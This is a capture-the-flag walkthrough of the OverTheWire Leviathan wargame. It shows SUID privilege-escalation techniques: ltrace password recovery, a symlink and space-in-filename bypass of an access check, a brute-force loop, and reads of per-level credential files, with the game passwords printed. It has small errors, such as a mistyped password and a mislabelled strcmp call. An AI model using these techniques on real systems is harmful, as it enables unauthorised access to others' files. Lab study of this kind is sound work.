Overthewire Leviathan Wargame report

Level 0 to Level 1

Having backups of your important files is essential for data security, as it allows you to recover from data loss. However, if backups are not properly secured, they can be exploited by attackers to escalate privileges. This means attackers can gain more access or different types of access to your computer. In the context of this wargame, we can obtain the access rights of other users by exploiting poorly secured backups.

Task

Log into the level with SSH.
Get the password for the next level from the backup.
Server: leviathan.labs.overthewire.org

Connect to the leviathan Level 0 server using SSH:
ssh leviathan.labs.overthewire.org -p 2223 -l leviathan0

Enter the password when prompted: leviathan0

Use the ls command to list the contents of the directory.

leviathan0@gibson:~$ ls -la 
total 24
drwxr-xr-x  3 root       root       4096 Apr 23 18:04 .
drwxr-xr-x 83 root       root       4096 Apr 23 18:06 ..
drwxr-x---  2 leviathan1 leviathan0 4096 Apr 23 18:04 .backup
-rw-r--r--  1 root       root        220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root       root       3771 Jan  6  2022 .bashrc
-rw-r--r--  1 root       root        807 Jan  6  2022 .profile


By examining the access rights granted to various users and groups, we can observe that we, the user 'leviathan0', have been authorized to read and execute the contents of the '.backup' directory. Therefore, we can explore what is inside the directory.

Change directory to .backup 

leviathan0@gibson:~$ cd .backup
leviathan0@gibson:~/.backup$ ls
bookmarks.html

The folder consists of a single file named bookmarks.html, which appears to be quite extensive. It would be impractical to manually search through the contents due to its size. Nevertheless, we examine the file's format and content to gain an understanding of its contents.

leviathan0@gibson:~/.backup$ head bookmarks.html
<!DOCTYPE NETSCAPE-Bookmark-file-1>
<!-- This is an automatically generated file.
     It will be read and overwritten.
     DO NOT EDIT! -->
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=UTF-8">
<TITLE>Bookmarks</TITLE>
<H1 LAST_MODIFIED="1160271046">Bookmarks</H1>

<DL><p>
    <DT><H3 LAST_MODIFIED="1160249304" PERSONAL_TOOLBAR_FOLDER="true" ID="rdf:#$FvPhC3">Bookmarks Toolbar Folder</H3>

This file seems to be an HTML file containing bookmarks. However, due to the file's large size, manually searching through it would be impractical. Hence, I need to explore different ways to examine the file's contents. While there are multiple search criteria, one possible approach could be to utilize the 'grep' command to search for the term 'leviathan' within the file. Found a bookmark that contains a site from the OverTheWireLeviathan URL that contains the password for the next step. 

leviathan0@gibson:~/.backup$ cat bookmarks.html | grep leviathan
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is PPIfmI1qsA" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>



Level 1 to Level 2

Connect to the Bandit Level 1 server using SSH:
ssh leviathan.labs.overthewire.org -p 2223 -l leviathan1

Enter the password when prompted: PPIfmI1qsA

ls -la command to list the contents of the directory.

leviathan1@gibson:~$ ls -la
total 36
drwxr-xr-x  2 root       root        4096 Apr 23 18:04 .
drwxr-xr-x 83 root       root        4096 Apr 23 18:06 ..
-rw-r--r--  1 root       root         220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root       root        3771 Jan  6  2022 .bashrc
-r-sr-x---  1 leviathan2 leviathan1 15072 Apr 23 18:04 check
-rw-r--r--  1 root       root         807 Jan  6  2022 .profile



In this case, the "check" file is an executable that belongs to user leviathan2, and we have read and execute permissions. 

leviathan1@gibson:~$ ./check
password: pass
Wrong password, Good Bye ...

I am going to use ltrace to check if strcmp was called and what input parameters it received.
leviathan1@gibson:~$ ltrace ./check
__libc_start_main(0x80491e6, 1, 0xffffd5f4, 0 <unfinished ...>
printf("password: ")                                                      = 10
getchar(0xf7fbe4a0, 0xf7fd6f80, 0x786573, 0x646f67password: password
)                       = 112
getchar(0xf7fbe4a0, 0xf7fd6f70, 0x786573, 0x646f67)                       = 97
getchar(0xf7fbe4a0, 0xf7fd6170, 0x786573, 0x646f67)                       = 115
strcmp("pas", "sex")                                                      = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                                      = 29
+++ exited (status 0) +++



So I just chose a random password and it seems that ‘strcmp’ was in fact called: strcmp("tes", "sex"), the first three letters were compared to the password. So the password seems to be sex. Let’s check if that is correct by running the binary again.

leviathan1@gibson:~$ ./check
password: sex

This seems to work and gives us a shell in which we are user ’leviathan2’, because it was a SUID binary.This means we can now look for the actual password for the ’leviathan2’ user. Based on the description on the website, all passwords are stored under ’etc/leviathan_pass’.

$ whoami
leviathan2
$ cd /etc/leviathan_pass/
$ ls
leviathan0  leviathan1  leviathan2  leviathan3  leviathan4  leviathan5  leviathan6  leviathan7
$ cat leviathan2
mEh5PNl10e



Level 2 to Level 3


Task

Log into the level with SSH.
Get the password for the next level from the /etc directory by using the ./printfile executable file. 
Server: leviathan.labs.overthewire.org


This level involves using unusual inputs to exploit differences in function inputs and achieve privilege escalation. A link is a symbolic pointer that points to an original file and allows access to it from other folders, instead of creating a separate copy.

Connect to the leviathan Level 2 server using SSH: 
ssh leviathan.labs.overthewire.org -p 2223 -l leviathan2
Enter the password when prompted: mEh5PNl10e




To start, the user looks at the content of the home folder and finds a SUID binary owned by user 'leviathan3' called 'printfile'. 

ls -la command to list the contents of the directory.

ssh leviathan.labs.overthewire.org -p 2223 -l leviathan2
leviathan2@gibson:~$ ls -la
total 36
drwxr-xr-x  2 root       root        4096 Apr 23 18:04 .
drwxr-xr-x 83 root       root        4096 Apr 23 18:06 ..
-rw-r--r--  1 root       root         220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root       root        3771 Jan  6  2022 .bashrc
-r-sr-x---  1 leviathan3 leviathan2 15060 Apr 23 18:04 printfile
-rw-r--r--  1 root       root         807 Jan  6  2022 .profile



leviathan2@gibson:~$ ./printfile
*** File Printer ***
Usage: ./printfile filename

I attempted to print the password file for the 'leviathan3' user, but it failed due to a lack of permission. 

leviathan2@gibson:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file…




I decided to use ltrace to better understand the program. 

ltrace ./printfile .bash_logout
__libc_start_main(0x80491e6, 2, 0xffffd5e4, 0 <unfinished ...>
access(".bash_logout", 4)                                                 = 0
snprintf("/bin/cat .bash_logout", 511, "/bin/cat %s", ".bash_logout")     = 21
geteuid()                                                                 = 12002
geteuid()                                                                 = 12002
setreuid(12002, 12002)                                                    = 0
system("/bin/cat .bash_logout"# ~/.bash_logout: executed by bash(1) when login shell exits.

# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                    = 0
+++ exited (status 0) +++

The 'access' function is called to check whether the user has permission to access the file, and '/bin/cat' is used to print the file. 


When I tried to use two files as an input only the first file was printed.
 
ltrace ./printfile .bash_logout .profile
__libc_start_main(0x80491e6, 3, 0xffffd5c4, 0 <unfinished ...>
access(".bash_logout", 4)                                                 = 0
snprintf("/bin/cat .bash_logout", 511, "/bin/cat %s", ".bash_logout")     = 21
geteuid()                                                                 = 12002
geteuid()                                                                 = 12002
setreuid(12002, 12002)                                                    = 0
system("/bin/cat .bash_logout"# ~/.bash_logout: executed by bash(1) when login shell exits.

# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                    = 0
+++ exited (status 0) +++





“/bin/cat” only considers the part of the file name before the space.(/tmp/tmp.grc03ku2P7).

 mktemp -d
/tmp/tmp.grc03ku2P7
leviathan2@gibson:~$ touch /tmp/tmp.grc03ku2P7/"pass lvl3.txt"
leviathan2@gibson:~$ ls -la /tmp/tmp.grc03ku2P7
total 136
drwx------    2 leviathan2 leviathan2   4096 May 11 09:24 .
drwxrwx-wt 3290 root       root       131072 May 11 09:24 ..
-rw-rw-r--    1 leviathan2 leviathan2      0 May 11 09:24 pass lvl3.txt
leviathan2@gibson:~$ ltrace ./printfile /tmp/tmp.grc03ku2P7/"pass lvl3.txt"
__libc_start_main(0x80491e6, 2, 0xffffd5d4, 0 <unfinished ...>
access("/tmp/tmp.grc03ku2P7/pass lvl3.tx"..., 4)                          = 0
snprintf("/bin/cat /tmp/tmp.grc03ku2P7/pas"..., 511, "/bin/cat %s", "/tmp/tmp.grc03ku2P7/pass lvl3.tx"...) = 42
geteuid()                                                                 = 12002
geteuid()                                                                 = 12002
setreuid(12002, 12002)                                                    = 0
system("/bin/cat /tmp/tmp.grc03ku2P7/pas".../bin/cat: /tmp/tmp.grc03ku2P7/pass: No such file or directory
/bin/cat: lvl3.txt: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                    = 256
+++ exited (status 0) +++




By linking a file named 'pass' to the password file and giving 'leviathan3' access to the directory, the binary is tricked into calling the password file and bypassing the check.


ln -s /etc/leviathan_pass/leviathan3 /tmp/tmp.grc03ku2P7/pass
leviathan2@gibson:~$ ls -la
total 36
drwxr-xr-x  2 root       root        4096 Apr 23 18:04 .
drwxr-xr-x 83 root       root        4096 Apr 23 18:06 ..
-rw-r--r--  1 root       root         220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root       root        3771 Jan  6  2022 .bashrc
-r-sr-x---  1 leviathan3 leviathan2 15060 Apr 23 18:04 printfile
-rw-r--r--  1 root       root         807 Jan  6  2022 .profile
leviathan2@gibson:~$ ls -la /tmp/tmp.grc03ku2P7
total 136
drwx------    2 leviathan2 leviathan2   4096 May 11 09:29 .
drwxrwx-wt 3290 root       root       131072 May 11 09:30 ..
lrwxrwxrwx    1 leviathan2 leviathan2     30 May 11 09:29 pass -> /etc/leviathan_pass/leviathan3
-rw-rw-r--    1 leviathan2 leviathan2      0 May 11 09:24 pass lvl3.txt
leviathan2@gibson:~$ chmod 777 /tmp/tmp.grc03ku2P7
leviathan2@gibson:~$ ./printfile /tmp/tmp.grc03ku2P7/"pass lvl3.txt"
Q0G8j4sakn
/bin/cat: lvl3.txt: No such file or directory

Level 3 to Level 4

Task

Log into the level with SSH.
Get the password for the next level from the /etc directory by using the level3 executable file. 
Server: leviathan.labs.overthewire.org

Connect to the leviathan Level 3 server using SSH: 
ssh leviathan.labs.overthewire.org -p 2223 -l leviathan3


Enter the password when prompted: Q0G8j4sakn
ls -la command to list the contents of the directory.

leviathan3@gibson:~$ ls -la
total 40
drwxr-xr-x  2 root       root        4096 Apr 23 18:04 .
drwxr-xr-x 83 root       root        4096 Apr 23 18:06 ..
-rw-r--r--  1 root       root         220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root       root        3771 Jan  6  2022 .bashrc
-r-sr-x---  1 leviathan4 leviathan3 18072 Apr 23 18:04 level3
-rw-r--r--  1 root       root         807 Jan  6  2022 .profile

- Found a SUID binary called 'level3' that asks for a password.




- Used ltrace to analyze the binary.

leviathan3@gibson:~$ ./level3
Enter the password> Q0G8j4sakn
bzzzzzzzzap. WRONG
leviathan3@gibson:~$ ltrace ./level3
__libc_start_main(0x80492bf, 1, 0xffffd5f4, 0 <unfinished ...>
strcmp("h0no33", "kakaka")                                                = -1
printf("Enter the password> ")                                            = 20
fgets(Enter the password> Q0G8j4sakn
"Q0G8j4sakn\n", 256, 0xf7e2a620)                                    = 0xffffd3cc
strcmp("Q0G8j4sakn\n", "snlprintf\n")                                     = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                                                = 19
+++ exited (status 0) +++



- Found that the binary uses 'strcmp' to compare the input with the correct password.

- Ran the binary with the password 'snlprintf' and got a shell as 'leviathan4'.

leviathan3@gibson:~$ ./level3
Enter the password> snlprintf
[You've got shell]!
$ whoami
Leviathan4

- read the password file from “/etc/leviathan_pass/leviathan4”.

$ cat /etc/leviathan_pass/leviathan4
AgvropI4OA








Level 4 to Level 5

Task

Log into the level with SSH.
Get the password for the next level from the trash folder (Binary and ASCII Encoding). 
Server: leviathan.labs.overthewire.org
Use `ltrace` to see what the binary is doing.
Use Perl to convert the binary string to ASCII format.
Execute the binary and pass the output as input to the Perl command to get the password

Connect to the leviathan Level 4 server using SSH: 
ssh leviathan.labs.overthewire.org -p 2223 -l leviathan4

Enter the password when prompted: AgvropI4OA

Binary code is a basic representation of data and ASCII is a common encoding to represent human-readable text using 7 bits to represent one character. In the home directory, a directory called `.trash` belonging to the `leviathan4` group is found, with a SUID binary belonging to user `leviathan5`. The binary returns a binary string, which is the password file of user `leviathan5` transformed into binary format. The goal is to reverse the binary string into ASCII format to obtain the password.

ls -la command to list the contents of the directory.

leviathan4@gibson:~$ ls
leviathan4@gibson:~$ ls -la
total 24
drwxr-xr-x  3 root root       4096 Apr 23 18:04 .
drwxr-xr-x 83 root root       4096 Apr 23 18:06 ..
-rw-r--r--  1 root root        220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root root       3771 Jan  6  2022 .bashrc
-rw-r--r--  1 root root        807 Jan  6  2022 .profile
dr-xr-x---  2 root leviathan4 4096 Apr 23 18:04 .trash
leviathan4@gibson:~$ cd .trash
leviathan4@gibson:~/.trash$ ls
bin
leviathan4@gibson:~/.trash$ la -la
total 24
dr-xr-x--- 2 root       leviathan4  4096 Apr 23 18:04 .
drwxr-xr-x 3 root       root        4096 Apr 23 18:04 ..
-r-sr-x--- 1 leviathan5 leviathan4 14928 Apr 23 18:04 bin

Use `file` command to check the type of the binary.
leviathan4@gibson:~/.trash$ file ./bin
./bin: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=27f52c687c97c02841058c6b6ae07efe97f23226, for GNU/Linux 3.2.0, not stripped

 Use `ltrace` to see what the binary is doing:

leviathan4@gibson:~/.trash$ ltrace ./bin
__libc_start_main(0x80491a6, 1, 0xffffd5e4, 0 <unfinished ...>
fopen("/etc/leviathan_pass/leviathan5", "r")                              = 0
+++ exited (status 255) +++

leviathan4@gibson:~/.trash$ ./bin
01000101 01001011 01001011 01101100 01010100 01000110 00110001 01011000 01110001 01110011 00001010
Use Perl to convert the binary string to ASCII format: `echo <binary string> | perl -lpe '$_=pack"B*",$_'`.

leviathan4@gibson:~/.trash$ echo 0100010101001011010010110110110001010100010001100011000101011000011100010111001100001010 | perl -lpe '$_=pack"B*",$_'
EKKlTF1Xqs

The output is the password in ASCII format.

Level 5 to Level 6

Task

Log into the level with SSH.
Get the password for the next level from the leviathan5 executable file. 
Server: leviathan.labs.overthewire.org

Connect to the leviathan Level 5 server using SSH: 
ssh leviathan.labs.overthewire.org -p 2223 -l leviathan5

Enter the password when prompted: EKKlF1Xqs

ls -la command to list the contents of the directory.

leviathan5@gibson:~$ ls -la
total 36
drwxr-xr-x  2 root       root        4096 Apr 23 18:04 .
drwxr-xr-x 83 root       root        4096 Apr 23 18:06 ..
-rw-r--r--  1 root       root         220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root       root        3771 Jan  6  2022 .bashrc
-r-sr-x---  1 leviathan6 leviathan5 15132 Apr 23 18:04 leviathan5
-rw-r--r--  1 root       root         807 Jan  6  2022 .profile

There is a SUID binary called ’leviathan5’ in the home directory. I run the binary to see what it does. In this case, the binary prints the message "Cannot find /tmp/file.log".

leviathan5@gibson:~$ ./leviathan5
Cannot find /tmp/file.log

Run the binary with ltrace to understand the underlying library calls and the program better. Here, we see that the binary is trying to open a file called ‘/tmp/file.log’ that does not exist.

leviathan5@gibson:~$ ltrace ./leviathan5
__libc_start_main(0x8049206, 1, 0xffffd5f4, 0 <unfinished ...>
fopen("/tmp/file.log", "r")                                               = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)                                         = 26
exit(-1 <no return ...>
+++ exited (status 255) +++

Create the file ‘/tmp/file.log’ to see what happens once the file exists. This step is necessary because the binary immediately exits if the file does not exist.

leviathan5@gibson:~$ touch /tmp/file.log
leviathan5@gibson:~$ ./leviathan5
leviathan5@gibson:~$

Run the binary again, but it does not return anything. This is because it is likely trying to print the content of ‘/tmp/file.log’ that we haven’t written anything in. To test this theory, we can either write something into the file or use ltrace again. Instead I created a symbolic link that leads to the password file.

leviathan5@gibson:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@gibson:~$ ./leviathan5
YZ55XPVk2l

I run the binary again, and it will print the password for the next level because of the symbolic link that leads to the password file.


Level 6 to Level 7
Task

Log into the level with SSH.
Get the password for the next level from the leviathan5 executable file. 
Server: leviathan.labs.overthewire.org

Connect to the leviathan Level 5 server using SSH: 
ssh leviathan.labs.overthewire.org -p 2223 -l leviathan6

Enter the password when prompted: YZ55XPVk2l

ls -la command to list the contents of the directory.

leviathan6@gibson:~$ ls
leviathan6
leviathan6@gibson:~$ ls -la
total 36
drwxr-xr-x  2 root       root        4096 Apr 23 18:05 .
drwxr-xr-x 83 root       root        4096 Apr 23 18:06 ..
-rw-r--r--  1 root       root         220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root       root        3771 Jan  6  2022 .bashrc
-r-sr-x---  1 leviathan7 leviathan6 15024 Apr 23 18:05 leviathan6
-rw-r--r--  1 root       root         807 Jan  6  2022 .profile
leviathan6@gibson:~$ ./leviathan6
usage: ./leviathan6 <4 digit code>
I run the binary to see what it does. In this case it asks for a 4 digit numeric password. 
With brute-force method we can get the password.  

leviathan6@gibson:~$ for i in {0000..9999}; do ./leviathan6 $i; done
Wrong
Wrong
.
.
Wrong
Wrong
$ 
$ whoami
leviathan7

Now we can read the password 

$ cat /etc/leviathan_pass/leviathan7
8GpZ5f8Hze
Level 7 to Level 8

Connect to the Bandit Level 7 server using SSH:

Connect to the leviathan Level 5 server using SSH: 
ssh leviathan.labs.overthewire.org -p 2223 -l leviathan7

Enter the password when prompted: 8GpZ5f8Hze

ls -la command to list the contents of the directory.

leviathan7@gibson:~$ ls -la
total 24
drwxr-xr-x  2 root       root       4096 Apr 23 18:05 .
drwxr-xr-x 83 root       root       4096 Apr 23 18:06 ..
-rw-r--r--  1 root       root        220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root       root       3771 Jan  6  2022 .bashrc
-r--r-----  1 leviathan7 leviathan7  178 Apr 23 18:05 CONGRATULATIONS
-rw-r--r--  1 root       root        807 Jan  6  2022 .profile
leviathan7@gibson:~$ cat CONGRATULATIONS
Well Done, you seem to have used a *nix system before, now try something more serious.
(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)
leviathan7@gibson:~$
